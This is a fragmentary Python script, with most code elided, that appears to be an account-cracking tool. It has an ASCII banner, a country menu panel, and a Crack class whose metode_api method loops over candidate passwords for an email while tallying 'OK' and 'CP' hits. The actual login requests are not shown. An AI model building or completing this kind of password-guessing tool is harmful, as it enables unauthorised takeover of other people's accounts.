...
class Logo:
	...
	def logonya(self):
		...
		prints(Panel(f"""{H2}╭─────────╮\n│ {M2}⬤  {K2}⬤  {H2}⬤ {H2}│ \n{H2}╰─────────╯{H2}
  ______    __    __  .___  ___. ____    ____  _______    ___       __      
 /  __  \  |  |  |  | |   \/   | \   \  /   / |   ____|  /   \     |  |     
|  |  |  | |  |__|  | |  \  /  |  \   \/   /  |  |__    /  ^  \    |  |     
|  |  |  | |   __   | |  |\/|  |   \_    _/   |   __|  /  /_\  \   |  |     
|  `--'  | |  |  |  | |  |  |  |     |  |     |  |    /  _____  \  |  `----.
...
class Menu:
	...
	def menu(self):
		...
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {H2}• {K2}• {H2}Negara {M2}• {H2}• {K2}•",subtitle=f"{M2}• {H2}• {K2}• {H2}Version : VERSI 0:1{M2} • {H2}• {K2}•",style=f"{color_panel}"))
...
class Crack:
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}FALL-XD{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
